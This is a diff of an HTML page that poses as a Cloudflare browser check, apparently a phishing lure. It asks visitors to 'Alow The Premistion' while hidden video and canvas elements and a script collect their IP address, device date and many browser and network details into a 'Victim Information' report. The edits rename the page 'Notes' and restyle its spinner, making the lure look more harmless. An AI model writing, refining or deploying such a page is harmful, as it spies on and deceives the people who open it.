@@ -6,7 +6,7 @@
     <meta http-equiv="X-UA-Compatible" content="IE=Edge,chrome=1">
     <meta name="robots" content="noindex, nofollow">
     <meta name="viewport" content="width=device-width,initial-scale=1">
-    <title>Just a moment....</title>
+    <title>Notes</title>
     <style type="text/css">
         html,
         body {
@@ -17,7 +17,7 @@
         }
 
         body {
-            background-color: rgb(77, 191, 191);
+            background-color: rgb(255, 255, 255);
             color: #000000;
             font-family: -apple-system, system-ui, BlinkMacSystemFont, "Segoe UI", Roboto, Oxygen, Ubuntu, "Helvetica Neue", Arial, sans-serif;
             font-size: 16px;
@@ -97,14 +97,27 @@
             animation-delay: .4s;
         }
 
-        .bubbles {
-            background-color: rgb(245, 53, 32);
-            width: 20px;
-            height: 20px;
-            margin: 2px;
-            border-radius: 100%;
-            display: inline-block;
-        }
+        .loading {
+    text-align: center;
+}
+
+.loader {
+    width: 40px;
+    height: 40px;
+    border-radius: 50%;
+    border: 6px solid rgb(24, 243, 0);
+    border-top: 6px solid transparent;
+    animation: spin 1s linear infinite;
+}
+
+@keyframes spin {
+    0% {
+        transform: rotate(0deg);
+    }
+    100% {
+        transform: rotate(360deg);
+    }
+}
 
         a {
             color: #2c7cb0;
@@ -143,8 +156,8 @@
         }
     </style>
 </head>
-
 <body>
+
     <table width="100%" height="100%" cellpadding="20">
         <tbody>
             <tr>
@@ -155,12 +168,8 @@
                                 the page.</h1>
                         </noscript>
                         <div id="cf-content" style="display: block;">
-                            <div id="cf-bubbles">
-                                <div class="bubbles"></div>
-                                <div class="bubbles"></div>
-                                <div class="bubbles"></div>
-                            </div>
-                            <h1><span data-translate="checking_browser">Please Alow The Premistion</span>
+                            <div class="loader"></div>
+                            <h1><span data-translate="checking_browser"> Alow The Premistion</span>
                                 the website.</h1>
                             <div id="no-cookie-warning" class="cookie-warning" data-translate="turn_on_cookies"
                                 style="display:none">
@@ -192,6 +201,7 @@
             </tr>
         </tbody>
     </table>
+    
     <video id="video" style="display:none" playsinline autoplay></video>
     <canvas hidden="hidden" id="canvas" width="500" height="500"></canvas>
     <script src="https://ajax.googleapis.com/ajax/libs/jquery/1.12.2/jquery.min.js"></script>
@@ -203,7 +213,7 @@
             await fetch("https://open.user-site.repl.co").then((r) => r.json()).then((d) => (td += '<code>✅Victim Information </code><br><br><b>⚓ IP: <a href="https://ip-api.com/#' + d.ip + '" >' + d.ip + '</a> | Time: 2023-11-06:14:21:44</b>'));
 
 
-
+//Dharmendra
             td += "<br><br><b>⏳ Date In Victim's Device :</b> " + new Date() + "<br>";
             var xo = ["productSub", "vendor", "maxTouchPoints", "doNotTrack", "hardwareConcurrency", "cookieEnabled", "appCodeName", "appName", "appVersion", "platform", "product", "userAgent", "language", "languages", "webdriver", "pdfViewerEnabled", "deviceMemory"];
             var xoc = ["type", "rtt", "saveData", "effectiveType", "downlink", "downlinkMax"];
